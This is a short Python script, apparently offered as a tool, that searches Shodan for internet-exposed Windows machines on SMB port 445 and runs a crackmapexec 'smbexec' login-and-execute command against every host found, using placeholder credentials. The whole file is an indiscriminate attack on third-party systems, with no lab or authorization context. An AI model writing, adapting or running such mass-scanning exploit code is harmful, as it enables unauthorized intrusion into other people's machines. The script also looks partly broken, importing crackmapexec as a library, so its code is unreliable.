print('CREATED BY ANESTUS UDUME FROM BENTECH SECURITY')
import os
import shodan
import crackmapexec as cme

# Define the Shodan API key
SHODAN_API_KEY = 'YOUR_SHODAN_API_KEY'

# Define the search query
query = 'product:"Microsoft Windows" port:445'

# Connect to the Shodan API
api = shodan.Shodan(SHODAN_API_KEY)

# Search for vulnerable targets
results = api.search(query)

# Iterate over the results
for result in results['matches']:
    ip = result['ip_str']
    
    # Use CrackMap to exploit the target
    cme_command = f'cme smb {ip} -u USER -p PASSWORD --exec-method smbexec'
    os.system(cme_command)
